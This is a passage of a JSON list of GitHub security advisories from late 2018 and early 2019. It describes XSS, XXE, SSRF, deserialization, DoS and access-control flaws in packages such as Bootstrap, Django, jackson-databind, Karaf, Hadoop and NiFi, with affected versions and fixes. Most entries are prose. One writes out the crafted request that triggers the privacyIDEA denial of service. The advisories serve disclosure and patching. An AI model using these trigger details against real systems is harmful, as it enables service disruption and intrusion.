    "publishedAt": "2019-01-17T13:57:34Z",
    "description": "In Bootstrap before 3.4.0, XSS is possible in the tooltip data-viewport attribute.",
    "summary": "Low severity vulnerability that affects bootstrap"
  },
  {
    "ghsaId": "GHSA-4p24-vmcr-4gqj",
    "publishedAt": "2019-01-17T13:57:27Z",
    "description": "In Bootstrap 3.x before 3.4.0 and 4.x-beta before 4.0.0-beta.2, XSS is possible in the data-target attribute. Note that this is a different vulnerability than CVE-2018-14041.\r\n\r\nSee https://blog.getbootstrap.com/2018/12/13/bootstrap-3-4-0/ for more info.",
    "summary": "Low severity vulnerability that affects bootstrap"
  },
  {
    "ghsaId": "GHSA-wjxj-f8rg-99wx",
    "publishedAt": "2019-01-17T13:56:40Z",
    "description": "Apache Thrift Java client library versions 0.5.0 through 0.11.0 can bypass SASL negotiation isComplete validation in the org.apache.thrift.transport.TSaslTransport class. An assert used to determine if the SASL handshake had successfully completed could be disabled in production settings making the validation incomplete.",
    "summary": "Moderate severity vulnerability that affects org.apache.thrift:libthrift"
  },
  {
    "ghsaId": "GHSA-vx85-mj8c-4qm6",
    "publishedAt": "2019-01-17T13:56:33Z",
    "description": "The Apache Thrift Node.js static web server in versions 0.9.2 through 0.11.0 have been determined to contain a security vulnerability in which a remote user has the ability to access files outside the set webservers docroot path.",
    "summary": "Moderate severity vulnerability that affects org.apache.thrift:libthrift"
  },
  {
    "ghsaId": "GHSA-jhjh-ghwx-6h7r",
    "publishedAt": "2019-01-17T13:56:18Z",
    "description": "modulemd 1.3.1 and earlier uses an unsafe function for processing externally provided data, leading to remote code execution.",
    "summary": "Low severity vulnerability that affects modulemd"
  },
  {
    "ghsaId": "GHSA-337x-4q8g-prc5",
    "publishedAt": "2019-01-14T16:20:05Z",
    "description": "In Django 1.11.x before 1.11.18, 2.0.x before 2.0.10, and 2.1.x before 2.1.5, an Improper Neutralization of Special Elements in Output Used by a Downstream Component issue exists in django.views.defaults.page_not_found(), leading to content spoofing (in a 404 error page) if a user fails to recognize that a crafted URL has malicious content.",
    "summary": "Low severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-mc23-976p-j42x",
    "publishedAt": "2019-01-14T16:19:55Z",
    "description": "A remote code execution vulnerability exists in Xterm.js when the component mishandles special characters, aka \"Xterm Remote Code Execution Vulnerability.\" This affects xterm.js.",
    "summary": "Low severity vulnerability that affects xterm"
  },
  {
    "ghsaId": "GHSA-7qqv-r2q4-jxhm",
    "publishedAt": "2019-01-14T16:19:31Z",
    "description": "privacyIDEA version 2.23.1 and earlier contains a Improper Input Validation vulnerability in token validation api that can result in Denial-of-Service. This attack appear to be exploitable via http request with user=<space>&pass= to /validate/check url. This vulnerability appears to have been fixed in 2.23.2.",
    "summary": "High severity vulnerability that affects privacyIDEA"
  },
  {
    "ghsaId": "GHSA-cq9c-55r7-455x",
    "publishedAt": "2019-01-07T19:14:51Z",
    "description": "In Apache Karaf version prior to 3.0.9, 4.0.9, 4.1.1, when the webconsole feature is installed in Karaf, it is available at .../system/console and requires authentication to access it. One part of the console is a Gogo shell/console that gives access to the command line console of Karaf via a Web browser, and when navigated to it is available at .../system/console/gogo. Trying to go directly to that URL does require authentication. And optional bundle that some applications use is the Pax Web Extender Whiteboard, it is part of the pax-war feature and perhaps others. When it is installed, the Gogo console becomes available at another URL .../gogo/, and that URL is not secured giving access to the Karaf console to unauthenticated users. A mitigation for the issue is to manually stop/uninstall Gogo plugin bundle that is installed with the webconsole feature, although of course this removes the console from the .../system/console application, not only from the unauthenticated endpoint. One could also stop/uninstall the Pax Web Extender Whiteboard, but other components/applications may require it and so their functionality would be reduced/compromised.",
    "summary": "Moderate severity vulnerability that affects org.apache.karaf:apache-karaf"
  },
  {
    "ghsaId": "GHSA-92wj-x78c-m4fx",
    "publishedAt": "2019-01-07T19:14:49Z",
    "description": "Apache Karaf provides a features deployer, which allows users to \"hot deploy\" a features XML by dropping the file directly in the deploy folder. The features XML is parsed by XMLInputFactory class. Apache Karaf XMLInputFactory class doesn't contain any mitigation codes against XXE. This is a potential security risk as an user can inject external XML entities in Apache Karaf version prior to 4.1.7 or 4.2.2. It has been fixed in Apache Karaf 4.1.7 and 4.2.2 releases.",
    "summary": "Moderate severity vulnerability that affects org.apache.karaf:karaf"
  },
  {
    "ghsaId": "GHSA-chj8-5xgw-wcvj",
    "publishedAt": "2019-01-07T19:14:46Z",
    "description": "Apache Karaf prior to 4.0.8 used the LDAPLoginModule to authenticate users to a directory via LDAP. However, it did not encoding usernames properly and hence was vulnerable to LDAP injection attacks leading to a denial of service.",
    "summary": "Moderate severity vulnerability that affects org.apache.karaf:apache-karaf"
  },
  {
    "ghsaId": "GHSA-q485-j897-qc27",
    "publishedAt": "2019-01-07T19:14:34Z",
    "description": "c3p0 0.9.5.2 allows XXE in extractXmlConfigFromInputStream in com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java during initialization.",
    "summary": "Moderate severity vulnerability that affects com.mchange:c3p0"
  },
  {
    "ghsaId": "GHSA-j88m-953w-8r2c",
    "publishedAt": "2019-01-07T19:14:21Z",
    "description": "Error reporting within Rendertron 1.0.0 allows reflected Cross Site Scripting (XSS) from invalid URLs.",
    "summary": "Moderate severity vulnerability that affects rendertron"
  },
  {
    "ghsaId": "GHSA-4gq5-ch57-c2mg",
    "publishedAt": "2019-01-04T19:09:49Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.7 might allow remote attackers to execute arbitrary code by leveraging failure to block the blaze-ds-opt and blaze-ds-core classes from polymorphic deserialization.",
    "summary": "High severity vulnerability that affects com.fasterxml.jackson.core:jackson-databind"
  },
  {
    "ghsaId": "GHSA-x2w5-5m2g-7h5m",
    "publishedAt": "2019-01-04T19:09:46Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.7 might allow attackers to conduct external XML entity (XXE) attacks by leveraging failure to block unspecified JDK classes from polymorphic deserialization.",
    "summary": "High severity vulnerability that affects com.fasterxml.jackson.core:jackson-databind"
  },
  {
    "ghsaId": "GHSA-9mxf-g3x6-wv74",
    "publishedAt": "2019-01-04T19:07:06Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.7 might allow remote attackers to conduct server-side request forgery (SSRF) attacks by leveraging failure to block the axis2-jaxws class from polymorphic deserialization.",
    "summary": "High severity vulnerability that affects com.fasterxml.jackson.core:jackson-databind"
  },
  {
    "ghsaId": "GHSA-c8hm-7hpq-7jhg",
    "publishedAt": "2019-01-04T19:07:03Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.8 might allow attackers to have unspecified impact by leveraging failure to block the jboss-common-core class from polymorphic deserialization.",
    "summary": "High severity vulnerability that affects com.fasterxml.jackson.core:jackson-databind"
  },
  {
    "ghsaId": "GHSA-mx9v-gmh4-mgqw",
    "publishedAt": "2019-01-04T19:07:01Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.8 might allow attackers to have unspecified impact by leveraging failure to block the openjpa class from polymorphic deserialization.",
    "summary": "High severity vulnerability that affects com.fasterxml.jackson.core:jackson-databind"
  },
  {
    "ghsaId": "GHSA-f9hv-mg5h-xcw9",
    "publishedAt": "2019-01-04T19:06:57Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.8 might allow attackers to have unspecified impact by leveraging failure to block the axis2-transport-jms class from polymorphic deserialization.",
    "summary": "High severity vulnerability that affects com.fasterxml.jackson.core:jackson-databind"
  },
  {
    "ghsaId": "GHSA-645p-88qh-w398",
    "publishedAt": "2019-01-04T19:06:55Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.7 might allow remote attackers to execute arbitrary code by leveraging failure to block the slf4j-ext class from polymorphic deserialization.",
    "summary": "High severity vulnerability that affects com.fasterxml.jackson.core:jackson-databind"
  },
  {
    "ghsaId": "GHSA-mvjj-gqq2-p4hw",
    "publishedAt": "2019-01-04T19:05:35Z",
    "description": "React applications which rendered to HTML using the ReactDOMServer API were not escaping user-supplied attribute names at render-time. That lack of escaping could lead to a cross-site scripting vulnerability. This vulnerability can only affect some server-rendered React apps. Purely client-rendered apps are not affected. \r\n\r\nThis issue affected minor releases 16.0.x, 16.1.x, 16.2.x, 16.3.x, and 16.4.x. It was fixed in 16.0.1, 16.1.2, 16.2.1, 16.3.3, and 16.4.2.",
    "summary": "Low severity vulnerability that affects react-dom"
  },
  {
    "ghsaId": "GHSA-9r8w-6x8c-6jr9",
    "publishedAt": "2019-01-04T17:50:34Z",
    "description": "In Django 1.10.x before 1.10.8 and 1.11.x before 1.11.5, HTML autoescaping was disabled in a portion of the template for the technical 500 debug page. Given the right circumstances, this allowed a cross-site scripting attack. This vulnerability shouldn't affect most production sites since you shouldn't run with \"DEBUG = True\" (which makes this page accessible) in your production settings.",
    "summary": "Moderate severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-37hp-765x-j95x",
    "publishedAt": "2019-01-04T17:50:26Z",
    "description": "Django 1.10 before 1.10.7, 1.9 before 1.9.13, and 1.8 before 1.8.18 relies on user input in some cases to redirect the user to an \"on success\" URL. The security check for these redirects (namely ``django.utils.http.is_safe_url()``) considered some numeric URLs \"safe\" when they shouldn't be, aka an open redirect vulnerability. Also, if a developer relies on ``is_safe_url()`` to provide safe redirect targets and puts such a URL into a link, they could suffer from an XSS attack.",
    "summary": "Moderate severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-h4hv-m4h4-mhwg",
    "publishedAt": "2019-01-04T17:50:17Z",
    "description": "A maliciously crafted URL to a Django (1.10 before 1.10.7, 1.9 before 1.9.13, and 1.8 before 1.8.18) site using the ``django.views.static.serve()`` view could redirect to any other domain, aka an open redirect vulnerability.",
    "summary": "Moderate severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-r28v-mw67-m5p9",
    "publishedAt": "2019-01-04T17:50:07Z",
    "description": "An issue was discovered in Django 2.0 before 2.0.3, 1.11 before 1.11.11, and 1.8 before 1.8.19. The django.utils.html.urlize() function was extremely slow to evaluate certain inputs due to catastrophic backtracking vulnerabilities in two regular expressions (only one regular expression for Django 1.8.x). The urlize() function is used to implement the urlize and urlizetrunc template filters, which were thus vulnerable.",
    "summary": "Moderate severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-2f9x-5v75-3qv4",
    "publishedAt": "2019-01-04T17:50:00Z",
    "description": "An issue was discovered in Django 2.0 before 2.0.3, 1.11 before 1.11.11, and 1.8 before 1.8.19. If django.utils.text.Truncator's chars() and words() methods were passed the html=True argument, they were extremely slow to evaluate certain inputs due to a catastrophic backtracking vulnerability in a regular expression. The chars() and words() methods are used to implement the truncatechars_html and truncatewords_html template filters, which were thus vulnerable.",
    "summary": "Moderate severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-38rv-5jqc-m2cv",
    "publishedAt": "2019-01-04T17:48:09Z",
    "description": "The Recurly Client Python Library before 2.0.5, 2.1.16, 2.2.22, 2.3.1, 2.4.5, 2.5.1, 2.6.2 is vulnerable to a Server-Side Request Forgery vulnerability in the \"Resource.get\" method that could result in compromise of API keys or other critical resources.",
    "summary": "High severity vulnerability that affects recurly"
  },
  {
    "ghsaId": "GHSA-98gj-wwxm-cj3h",
    "publishedAt": "2019-01-04T17:47:50Z",
    "description": "Cross-site scripting (XSS) vulnerability in the _keyify function in mistune.py in Mistune before 0.8.1 allows remote attackers to inject arbitrary web script or HTML by leveraging failure to escape the \"key\" argument.",
    "summary": "Moderate severity vulnerability that affects mistune"
  },
  {
    "ghsaId": "GHSA-xvwv-6wvx-px9x",
    "publishedAt": "2019-01-04T17:47:21Z",
    "description": "By linking to a specific url in Plone 2.5-5.1rc1 with a parameter, an attacker could send you to his own website. On its own this is not so bad: the attacker could more easily link directly to his own website instead. But in combination with another attack, you could be sent to the Plone login form and login, then get redirected to the specific url, and then get a second redirect to the attacker website. (The specific url can be seen by inspecting the hotfix code, but we don't want to make it too easy for attackers by spelling it out here.)",
    "summary": "Moderate severity vulnerability that affects plone"
  },
  {
    "ghsaId": "GHSA-m9mq-p2f9-cfqv",
    "publishedAt": "2019-01-04T17:46:30Z",
    "description": "An issue was discovered in Bleach 2.1.x before 2.1.3. Attributes that have URI values weren't properly sanitized if the values contained character entities. Using character entities, it was possible to construct a URI value with a scheme that was not allowed that would slide through unsanitized.",
    "summary": "Critical severity vulnerability that affects bleach"
  },
  {
    "ghsaId": "GHSA-42fp-4hm3-j8r7",
    "publishedAt": "2019-01-04T17:46:08Z",
    "description": "Cross-site scripting (XSS) vulnerability in the link dialogue in GUI editor in MoinMoin before 1.9.10 allows remote attackers to inject arbitrary web script or HTML via unspecified vectors.",
    "summary": "Moderate severity vulnerability that affects moin"
  },
  {
    "ghsaId": "GHSA-rprw-h62v-c2w7",
    "publishedAt": "2019-01-04T17:45:26Z",
    "description": "In PyYAML before 4.1, the yaml.load() API could execute arbitrary code. In other words, yaml.safe_load is not used.",
    "summary": "High severity vulnerability that affects pyyaml"
  },
  {
    "ghsaId": "GHSA-2x54-j4m3-r6wx",
    "publishedAt": "2019-01-04T17:44:48Z",
    "description": "Sqla_yaml_fixtures 0.9.1 allows local users to execute arbitrary python code via the fixture_text argument in sqla_yaml_fixtures.load.",
    "summary": "High severity vulnerability that affects sqla-yaml-fixtures"
  },
  {
    "ghsaId": "GHSA-45r8-3495-x6rm",
    "publishedAt": "2019-01-04T17:43:36Z",
    "description": "Jinjava before 2.4.6 does not block the getClass method, related to com/hubspot/jinjava/el/ext/JinjavaBeanELResolver.java.",
    "summary": "High severity vulnerability that affects com.hubspot.jinjava:jinjava"
  },
  {
    "ghsaId": "GHSA-qqv6-5w6p-3pgr",
    "publishedAt": "2019-01-04T17:43:30Z",
    "description": "An issue was discovered in hsweb 3.0.4. It is a reflected XSS vulnerability due to the absence of type parameter checking in FlowableModelManagerController.java.",
    "summary": "Moderate severity vulnerability that affects org.hswebframework.web:hsweb-commons"
  },
  {
    "ghsaId": "GHSA-4rm3-4mq4-mfwr",
    "publishedAt": "2019-01-04T17:43:22Z",
    "description": "A CSRF issue was discovered in web/authorization/oauth2/controller/OAuth2ClientController.java in hsweb 3.0.4 because the state parameter in the request is not compared with the state parameter in the session after user authentication is successful.",
    "summary": "Moderate severity vulnerability that affects org.hswebframework.web:hsweb-commons"
  },
  {
    "ghsaId": "GHSA-j87c-cj65-vmh5",
    "publishedAt": "2019-01-04T17:41:51Z",
    "description": "Rendertron 1.0.0 allows for alternative protocols such as 'file://' introducing a Local File Inclusion (LFI) bug where arbitrary files can be read by a remote attacker.",
    "summary": "High severity vulnerability that affects rendertron"
  },
  {
    "ghsaId": "GHSA-4q69-q4q7-x82c",
    "publishedAt": "2019-01-04T17:41:46Z",
    "description": "Rendertron 1.0.0 includes an _ah/stop route to shutdown the Chrome instance responsible for serving render requests to all users. Visiting this route with a GET request allows any unauthorized remote attacker to disable the core service of the application.",
    "summary": "High severity vulnerability that affects rendertron"
  },
  {
    "ghsaId": "GHSA-29gp-92wp-94q8",
    "publishedAt": "2019-01-04T17:41:20Z",
    "description": "react-dev-utils on Windows allows developers to run a local webserver for accepting various commands, including a command to launch an editor. The input to that command was not properly sanitized, allowing an attacker who can make a network request to the server (either via CSRF or by direct request) to execute arbitrary commands on the targeted system. This issue affects multiple branches: 1.x.x prior to 1.0.4, 2.x.x prior to 2.0.2, 3.x.x prior to 3.1.2, 4.x.x prior to 4.2.2, and 5.x.x prior to 5.0.2.",
    "summary": "Moderate severity vulnerability that affects react-dev-utils"
  },
  {
    "ghsaId": "GHSA-cf66-xwfp-gvc4",
    "publishedAt": "2019-01-04T17:40:59Z",
    "description": "An issue was discovered in lib/Server.js in webpack-dev-server before 3.1.11. Attackers are able to steal developer's code because the origin of requests is not checked by the WebSocket server, which is used for HMR (Hot Module Replacement). Anyone can receive the HMR message sent by the WebSocket server via a ws://127.0.0.1:8080/ connection from any origin.",
    "summary": "Low severity vulnerability that affects webpack-dev-server"
  },
  {
    "ghsaId": "GHSA-v4x4-98cg-wr4g",
    "publishedAt": "2018-12-26T17:45:19Z",
    "description": "There is a vulnerability in load() method in definitions/parser.py in the Danijar Hafner definitions package for Python. It can execute arbitrary python commands resulting in command execution.",
    "summary": "Moderate severity vulnerability that affects definitions"
  },
  {
    "ghsaId": "GHSA-3448-vfvv-xp9g",
    "publishedAt": "2018-12-26T17:45:07Z",
    "description": "A carefully crafted or corrupt sqlite file can cause an infinite loop in Apache Tika's SQLite3Parser in versions 1.8-1.19.1 of Apache Tika.",
    "summary": "Moderate severity vulnerability that affects org.apache.tika:tika-core"
  },
  {
    "ghsaId": "GHSA-7x9j-7223-rg5m",
    "publishedAt": "2018-12-21T17:51:51Z",
    "description": "Apache Commons FileUpload before 1.3.3 DiskFileItem File Manipulation Remote Code Execution",
    "summary": "High severity vulnerability that affects commons-fileupload:commons-fileupload"
  },
  {
    "ghsaId": "GHSA-xx68-jfcg-xmmf",
    "publishedAt": "2018-12-21T17:51:42Z",
    "description": "MultipartStream.java in Apache Commons FileUpload before 1.3.1, as used in Apache Tomcat, JBoss Web, and other products, allows remote attackers to cause a denial of service (infinite loop and CPU consumption) via a crafted Content-Type header that bypasses a loop's intended exit conditions.",
    "summary": "High severity vulnerability that affects commons-fileupload:commons-fileupload"
  },
  {
    "ghsaId": "GHSA-6x48-j4x4-cqw3",
    "publishedAt": "2018-12-21T17:50:29Z",
    "description": "Apache Hadoop 3.1.0, 3.0.0-alpha to 3.0.2, 2.9.0 to 2.9.1, 2.8.0 to 2.8.4, 2.0.0-alpha to 2.7.6, 0.23.0 to 0.23.11 is exploitable via the zip slip vulnerability in places that accept a zip file.",
    "summary": "Moderate severity vulnerability that affects org.apache.hadoop:hadoop-main"
  },
  {
    "ghsaId": "GHSA-rqj9-cq6j-958r",
    "publishedAt": "2018-12-21T17:50:26Z",
    "description": "In Apache Hadoop 2.7.4 to 2.7.6, the security fix for CVE-2016-6811 is incomplete. A user who can escalate to yarn user can possibly run arbitrary commands as root user.",
    "summary": "Moderate severity vulnerability that affects org.apache.hadoop:hadoop-main"
  },
  {
    "ghsaId": "GHSA-mq8p-h798-xcrp",
    "publishedAt": "2018-12-21T17:50:20Z",
    "description": "The YARN NodeManager in Apache Hadoop 2.7.3 and 2.7.4 can leak the password for credential store provider used by the NodeManager to YARN Applications.",
    "summary": "Moderate severity vulnerability that affects org.apache.hadoop:hadoop-main"
  },
  {
    "ghsaId": "GHSA-3v44-382q-55f4",
    "publishedAt": "2018-12-21T17:50:13Z",
    "description": "Vulnerability in Apache Hadoop 0.23.x, 2.x before 2.7.5, 2.8.x before 2.8.3, and 3.0.0-alpha through 3.0.0-beta1 allows a cluster user to expose private files owned by the user running the MapReduce job history server process. The malicious user can construct a configuration file containing XML directives that reference sensitive files on the MapReduce job history server host.",
    "summary": "Moderate severity vulnerability that affects org.apache.hadoop:hadoop-main"
  },
  {
    "ghsaId": "GHSA-99qr-9cc9-fv2x",
    "publishedAt": "2018-12-21T17:50:03Z",
    "description": "In Apache Hadoop versions 2.6.1 to 2.6.5, 2.7.0 to 2.7.3, and 3.0.0-alpha1, if a file in an encryption zone with access permissions that make it world readable is localized via YARN's localization mechanism, that file will be stored in a world-readable location and can be shared freely with any application that requests to localize that file.",
    "summary": "Moderate severity vulnerability that affects org.apache.hadoop:hadoop-main"
  },
  {
    "ghsaId": "GHSA-9448-c9wq-jg9v",
    "publishedAt": "2018-12-21T17:49:33Z",
    "description": "In Apache Karaf prior to 4.2.0 release, if the sshd service in Karaf is left on so an administrator can manage the running instance, any user with rights to the Karaf console can pivot and read/write any file on the file system to which the Karaf process user has access. This can be locked down a bit by using chroot to change the root directory to protect files outside of the Karaf install directory; it can be further locked down by defining a security manager policy that limits file system access to those directories beneath the Karaf home that are necessary for the system to run. However, this still allows anyone with ssh access to the Karaf process to read and write a large number of files as the Karaf process user.",
    "summary": "Moderate severity vulnerability that affects org.apache.karaf:apache-karaf"
  },
  {
    "ghsaId": "GHSA-gf2j-7qwg-4f5x",
    "publishedAt": "2018-12-21T17:48:45Z",
    "description": "The SAML broker consumer endpoint in Keycloak before version 4.6.0.Final ignores expiration conditions on SAML assertions. An attacker can exploit this vulnerability to perform a replay attack.",
    "summary": "Moderate severity vulnerability that affects org.keycloak:keycloak-core"
  },
  {
    "ghsaId": "GHSA-j379-9jr9-w5cq",
    "publishedAt": "2018-12-21T17:48:26Z",
    "description": "Square Open Source Retrofit versions prior to commit 4a693c5aeeef2be6c7ecf80e7b5ec79f6ab59437 contain a XML External Entity (XXE) vulnerability in JAXB. An attacker could use this to remotely read files from the file system or to perform SSRF. This vulnerability appears to have been fixed in commit 4a693c5aeeef2be6c7ecf80e7b5ec79f6ab59437.",
    "summary": "Moderate severity vulnerability that affects com.squareup.retrofit2:retrofit"
  },
  {
    "ghsaId": "GHSA-8p8g-f9vg-r7xr",
    "publishedAt": "2018-12-21T17:48:19Z",
    "description": "Square Retrofit versions from (including) 2.0 to 2.5.0 (excluding) contain a Directory Traversal vulnerability in RequestBuilder class, method addPathParameter. By manipulating the URL an attacker could add or delete resources otherwise unavailable to her. This attack appears to be exploitable via an encoded path parameter on POST, PUT or DELETE request. This vulnerability appears to have been fixed in 2.5.0 and later.",
    "summary": "Moderate severity vulnerability that affects com.squareup.retrofit2:retrofit"
  },
  {
    "ghsaId": "GHSA-fvm3-cfvj-gxqq",
    "publishedAt": "2018-12-21T17:47:47Z",
    "description": "The MultipartStream class in Apache Commons Fileupload before 1.3.2, as used in Apache Tomcat 7.x before 7.0.70, 8.x before 8.0.36, 8.5.x before 8.5.3, and 9.x before 9.0.0.M7 and other products, allows remote attackers to cause a denial of service (CPU consumption) via a long boundary string.",
    "summary": "High severity vulnerability that affects commons-fileupload:commons-fileupload"
  },
  {
    "ghsaId": "GHSA-h4x4-5qp2-wp46",
    "publishedAt": "2018-12-21T17:46:54Z",
    "description": "Fasterxml Jackson version Before 2.9.8 contains a CWE-20: Improper Input Validation vulnerability in Jackson-Databind that can result in Causes a denial-of-service (DoS). This attack appear to be exploitable via The victim deserializes malicious input, specifically very large values in the nanoseconds field of a time value. This vulnerability appears to have been fixed in 2.9.8.",
    "summary": "Moderate severity vulnerability that affects com.fasterxml.jackson.datatype:jackson-datatype-jsr353"
  },
  {
    "ghsaId": "GHSA-gfv6-cj92-g3hx",
    "publishedAt": "2018-12-21T17:46:39Z",
    "description": "OpenKMIP PyKMIP version All versions before 0.8.0 contains a CWE 399: Resource Management Errors (similar issue to CVE-2015-5262) vulnerability in PyKMIP server that can result in DOS: the server can be made unavailable by one or more clients opening all of the available sockets. This attack appear to be exploitable via A client or clients open sockets with the server and then never close them. This vulnerability appears to have been fixed in 0.8.0.",
    "summary": "Moderate severity vulnerability that affects pykmip"
  },
  {
    "ghsaId": "GHSA-hjm9-576q-399p",
    "publishedAt": "2018-12-21T17:46:23Z",
    "description": "esigate.org esigate version 5.2 and earlier contains a CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') vulnerability in ESI directive with user specified XSLT that can result in Remote Code Execution. This attack appear to be exploitable via Use of another weakness in backend application to reflect ESI directives. This vulnerability appears to have been fixed in 5.3.",
    "summary": "Moderate severity vulnerability that affects org.esigate:esigate-core"
  },
  {
    "ghsaId": "GHSA-c289-47qf-rvrr",
    "publishedAt": "2018-12-21T17:46:03Z",
    "description": "easymon version 1.4 and earlier contains a Cross Site Scripting (XSS) vulnerability in Endpoint where monitoring is mounted that can result in Reflected XSS that affects Firefox. Can be used to steal cookies, depending on the cookie settings.. This attack appear to be exploitable via The victim must click on a crafted URL that contains the XSS payload. This vulnerability appears to have been fixed in 1.4.1 and later.",
    "summary": "Low severity vulnerability that affects easymon"
  },
  {
    "ghsaId": "GHSA-xmvg-w4f9-99r7",
    "publishedAt": "2018-12-20T22:02:51Z",
    "description": "bw-calendar-engine version <= bw-calendar-engine-3.12.0 contains a XML External Entity (XXE) vulnerability in IscheduleClient XML Parser that can result in Disclosure of confidential data, denial of service, SSRF, port scanning. This attack appear to be exploitable via Man in the Middle or malicious server.",
    "summary": "Moderate severity vulnerability that affects org.bedework.caleng:bw-calendar-engine"
  },
  {
    "ghsaId": "GHSA-3jq8-jg75-rqv6",
    "publishedAt": "2018-12-20T22:02:45Z",
    "description": "The template upload API endpoint accepted requests from different domain when sent in conjunction with ARP spoofing + man in the middle (MiTM) attack, resulting in a CSRF attack. The required attack vector is complex, requiring a scenario with client certificate authentication, same subnet access, and injecting malicious code into an unprotected (plaintext HTTP) website which the targeted user later visits, but the possible damage warranted a Severe severity level. Mitigation: The fix to apply Cross-Origin Resource Sharing (CORS) policy request filtering was applied on the Apache NiFi 1.8.0 release. Users running a prior 1.x release should upgrade to the appropriate release.",
    "summary": "Moderate severity vulnerability that affects org.apache.nifi:nifi"
  },
  {
    "ghsaId": "GHSA-4qq9-rrq6-48ff",
    "publishedAt": "2018-12-20T22:02:39Z",
    "description": "The message-page.jsp error page used the value of the HTTP request header X-ProxyContextPath without sanitization, resulting in a reflected XSS attack. Mitigation: The fix to correctly parse and sanitize the request attribute value was applied on the Apache NiFi 1.8.0 release. Users running a prior 1.x release should upgrade to the appropriate release.",
    "summary": "Moderate severity vulnerability that affects org.apache.nifi:nifi"
  },
  {
    "ghsaId": "GHSA-43fp-vwwg-qgv6",
    "publishedAt": "2018-12-20T22:02:32Z",
    "description": "When a client request to a cluster node was replicated to other nodes in the cluster for verification, the Content-Length was forwarded. On a DELETE request, the body was ignored, but if the initial request had a Content-Length value other than 0, the receiving nodes would wait for the body and eventually timeout. Mitigation: The fix to check DELETE requests and overwrite non-zero Content-Length header values was applied on the Apache NiFi 1.8.0 release. Users running a prior 1.x release should upgrade to the appropriate release.",
    "summary": "Moderate severity vulnerability that affects org.apache.nifi:nifi"
  },
  {
    "ghsaId": "GHSA-2xpp-75vr-22vq",
    "publishedAt": "2018-12-20T22:02:24Z",
    "description": "The X-Frame-Options headers were applied inconsistently on some HTTP responses, resulting in duplicate or missing security headers. Some browsers would interpret these results incorrectly, allowing clickjacking attacks. Mitigation: The fix to consistently apply the security headers was applied on the Apache NiFi 1.8.0 release. Users running a prior 1.x release should upgrade to the appropriate release.",
    "summary": "Low severity vulnerability that affects org.apache.nifi:nifi"
  },
  {
    "ghsaId": "GHSA-jxm5-5xcw-h57q",
    "publishedAt": "2018-12-20T22:02:17Z",
    "description": "exist version <= 5.0.0-RC4 contains a XML External Entity (XXE) vulnerability in XML Parser for REST Server that can result in Disclosure of confidential data, denial of service, SSRF, port scanning.",
    "summary": "Moderate severity vulnerability that affects org.exist-db:exist-core"
  },
  {
    "ghsaId": "GHSA-77hp-pfxw-4w63",
    "publishedAt": "2018-12-20T22:02:09Z",
    "description": "codelibs fess version before commit faa265b contains a XML External Entity (XXE) vulnerability in GSA XML file parser that can result in Disclosure of confidential data, denial of service, SSRF, port scanning. This attack appear to be exploitable via specially crafted GSA XML files. This vulnerability appears to have been fixed in after commit faa265b.",
    "summary": "Moderate severity vulnerability that affects org.codelibs.fess:fess"
  },
  {
    "ghsaId": "GHSA-r2pp-x4mm-4999",
    "publishedAt": "2018-12-20T22:02:02Z",
    "description": "neo4j-contrib neo4j-apoc-procedures version before commit 45bc09c contains a XML External Entity (XXE) vulnerability in XML Parser that can result in Disclosure of confidential data, denial of service, SSRF, port scanning. This vulnerability appears to have been fixed in after commit 45bc09c.",
    "summary": "Moderate severity vulnerability that affects org.neo4j.procedure:apoc"
  },
  {
    "ghsaId": "GHSA-j5rj-g695-342r",
    "publishedAt": "2018-12-20T22:01:54Z",
    "description": "FatFreeCRM version <=0.14.1, >=0.15.0 <=0.15.1, >=0.16.0 <=0.16.3, >=0.17.0 <=0.17.2, ==0.18.0 contains a Cross Site Scripting (XSS) vulnerability in commit 6d60bc8ed010c4eda05d6645c64849f415f68d65 that can result in Javascript execution. This attack appear to be exploitable via Content with Javascript payload will be executed on end user browsers when they visit the page. This vulnerability appears to have been fixed in 0.18.1, 0.17.3, 0.16.4, 0.15.2, 0.14.2.",
    "summary": "Moderate severity vulnerability that affects fat_free_crm"
  },
  {
    "ghsaId": "GHSA-mr4x-c4v9-x729",
    "publishedAt": "2018-12-20T22:01:46Z",
    "description": "aio-libs aiohttp-session version 2.6.0 and earlier contains a Other/Unknown vulnerability in EncryptedCookieStorage and NaClCookieStorage that can result in Non-expiring sessions / Infinite lifespan. This attack appear to be exploitable via Recreation of a cookie post-expiry with the same value.",
    "summary": "Moderate severity vulnerability that affects aiohttp-session"
  },
  {
    "ghsaId": "GHSA-p69g-f978-xxv9",
    "publishedAt": "2018-12-20T22:01:39Z",
    "description": "Luigi version prior to version 2.8.0; after commit 53b52e12745075a8acc016d33945d9d6a7a6aaeb; after GitHub PR spotify/luigi/pull/1870 contains a Cross ite Request Forgery (CSRF) vulnerability in API endpoint: /api/<method> that can result in Task metadata such as task name, id, parameter, etc. will be leaked to unauthorized users. This attack appear to be exploitable via The victim must visit a specially crafted webpage from the network where their Luigi server is accessible.. This vulnerability appears to have been fixed in 2.8.0 and later.",
    "summary": "Moderate severity vulnerability that affects luigi"
  },
  {
    "ghsaId": "GHSA-27xw-p8v6-9jjr",
    "publishedAt": "2018-12-20T22:01:31Z",
    "description": "Spring Security versions 5.1.x prior to 5.1.2 contain an authorization bypass vulnerability during JWT issuer validation. In order to be impacted, the same private key for an honest issuer and a malicious user must be used when signing JWTs. In that case, a malicious user could fashion signed JWTs with the malicious issuer URL that may be granted for the honest issuer.",
    "summary": "Moderate severity vulnerability that affects org.springframework.security:spring-security-core"
  },
  {
    "ghsaId": "GHSA-wg5w-vv93-3f7w",
    "publishedAt": "2018-12-20T22:01:18Z",
    "description": "Vulnerability allows a user of Apache Oozie 3.1.3-incubating to 5.0.0 to impersonate other users. The malicious user can construct an XML that results workflows running in other user's name.",
